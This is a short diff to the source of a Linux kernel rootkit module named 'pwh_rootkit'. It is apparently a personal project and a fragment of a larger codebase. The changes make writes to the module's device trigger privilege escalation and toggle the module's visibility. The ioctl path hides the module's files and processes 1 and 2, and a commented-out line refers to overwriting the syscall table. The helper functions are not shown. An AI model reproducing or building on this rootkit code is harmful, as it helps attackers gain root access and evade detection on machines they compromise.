@@ -22,15 +22,15 @@
 
 ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
     //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
-    return 0;
+
+
+    return count;
 }
 ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
-    size_t ret;
-    char filename[0x30] = {0};
-    ret = copy_from_user(filename, buf, count);
-
-    file_hidden(filename);
-    return 0;
+    privileged_escalation();
+    module_toggle();
+    // printk(KERN_INFO "[peiwithhao rootkit] write");
+    return count;
 }
 
 // struct hook_context write_hook_ctx;
@@ -54,7 +54,8 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
             file_hidden("pwhkit.ko");
             file_hidden("use");
             file_hidden("sys_table_finder");
-            module_hidden();
+            process_hidden(1);
+            process_hidden(2);
 
             // dir_hidden_weak("haaaa");
 
